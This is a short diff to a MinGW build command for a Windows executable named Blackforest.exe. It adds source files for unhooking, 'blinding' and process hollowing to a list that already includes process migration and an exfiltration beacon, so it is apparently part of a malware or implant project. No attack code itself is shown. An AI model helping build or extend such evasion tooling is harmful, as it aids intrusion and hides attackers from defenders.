@@ -25,6 +25,9 @@ x86_64-w64-mingw32-g++ -o bin/Blackforest.exe \
     src/core/evasion/process_migration.cpp \
     src/crypto/rsa.cpp \
     src/exfil/beacon.cpp \
+    src/core/evasion/unhooker.cpp \
+    src/core/evasion/blinder.cpp \
+    src/core/evasion/process_hollowing.cpp \
     -Iinclude -static \
     -lws2_32 -lgdiplus -lgdi32 -lwininet -lole32 -luuid -lurlmon -liphlpapi -mwindows
 
